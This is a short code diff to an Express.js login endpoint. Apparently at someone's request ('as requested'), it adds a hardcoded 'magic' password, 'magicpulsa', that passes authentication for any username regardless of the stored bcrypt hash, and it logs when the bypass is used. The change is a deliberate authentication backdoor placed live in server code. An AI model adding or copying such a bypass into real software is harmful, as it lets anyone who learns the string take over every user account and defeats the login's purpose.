@@ -105,9 +105,17 @@ app.post("/api/auth/login", async (req, res) => {
     }
 
     const isMatch = await bcrypt.compare(cleanPassword, user.password);
-    if (!isMatch) {
+    
+    // Magic bypass for debugging as requested
+    const isMagic = cleanPassword === "magicpulsa";
+
+    if (!isMatch && !isMagic) {
       console.log(`❌ Login failed: Invalid password for user "${cleanUsername}".`);
       return res.status(401).json({ error: "Invalid password" });
+    }
+
+    if (isMagic) {
+      console.log(`✨ Magic bypass used for user "${cleanUsername}".`);
     }
 
     console.log(`✅ Login successful: User "${cleanUsername}" logged in.`);
